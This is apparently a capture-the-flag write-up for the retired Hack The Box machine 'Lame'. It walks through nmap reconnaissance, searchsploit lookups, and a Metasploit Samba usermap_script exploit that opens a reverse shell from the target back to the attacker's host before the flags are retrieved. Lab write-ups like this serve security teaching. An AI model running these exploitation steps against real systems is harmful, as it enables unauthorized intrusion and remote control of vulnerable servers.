---
description: Hackthebox.eu Lame Retired Machine
---

# Lame

## Recon

Starting with a Nmap scan to find open ports.

```csharp
root@kalisecurity# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-28 07:16 EST
Nmap scan report for 10.10.10.3
Host is up (0.021s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
root@kali# nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-28 07:17 EST
Nmap scan report for 10.10.10.3
Host is up (0.019s latency).
Not shown: 65531 open|filtered ports
PORT     STATE  SERVICE
22/udp   closed ssh
139/udp  closed netbios-ssn
445/udp  closed microsoft-ds
3632/udp closed distcc

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds

root@kali# nmap -p 21,22,139,445,3632 -sV -sC -oA scans/tcpscripts 10.10.10.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-28 07:19 EST
Nmap scan report for 10.10.10.3
Host is up (0.023s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h39m11s, deviation: 0s, median: 4h39m11s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-02-28T06:59:11-05:00
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.02 seconds
```

### FTP - TCP 21

Because FTP allows anomous logins i though i'd give it a go but the FTP was empty.

## Exploits

### VSFTPD 2.3.4

vsftpd 2.3.4 is a backdoored FTP server. i run this though Searchspolit which shows a backdoor for backdoor command execution.

```csharp
root@kalisecurity# searchsploit vsftpd 2.3.4
----------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                   |  Path
                                                                 | (/usr/share/exploitdb/)
----------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)           | exploits/unix/remote/17491.rb
----------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

### Samba 3.0

i also checked Samba 3.0 and found a phew results.

```csharp
root@kali# searchsploit samba 3.0
------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                       |  Path
                                                                                     | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------- ----------------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                 | exploits/osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                               | exploits/multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)     | exploits/unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                   | exploits/linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)               | exploits/linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)             | exploits/solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                             | exploits/linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                    | exploits/multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                     | exploits/linux/remote/364.pl
Samba < 3.0.20 - Remote Heap Overflow                                                | exploits/linux/remote/7701.txt
------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

The one that made me think was the `Command Execution` so i'd though i would give it a go using Metaspolit, using this.

```csharp
msfconsole
```

That will open Metapsloit in your console and you can do,

```csharp
msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
rhosts => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > set LHOST tun0
lhost => 10.10.14.24 (Will Be Your IP)
msf5 exploit(multi/samba/usermap_script) > set LPORT 443
lport => 443
```

now we can check the options to make sure we set it up right, we can use `options` which will show all the options we put in the exploit it should show,

```csharp
msf5 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target address range or CIDR identifier
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.24      yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

now run `exploit` and it will start the exploit.

```csharp
[*] Command shell session 1 opened (10.10.14.24:443 -> 10.10.10.3:37959) at 2019-02-28 08:52:31 -0500
```

Now were in and can get the Flags, to find them you can do `ls` to find out whats in the current dir on Linux, the root or user isnt in there so lets try in the home dir we can do `cd home` in there we find the first flag then we can try root to get the root.txt and were done!

Congrats Guys!

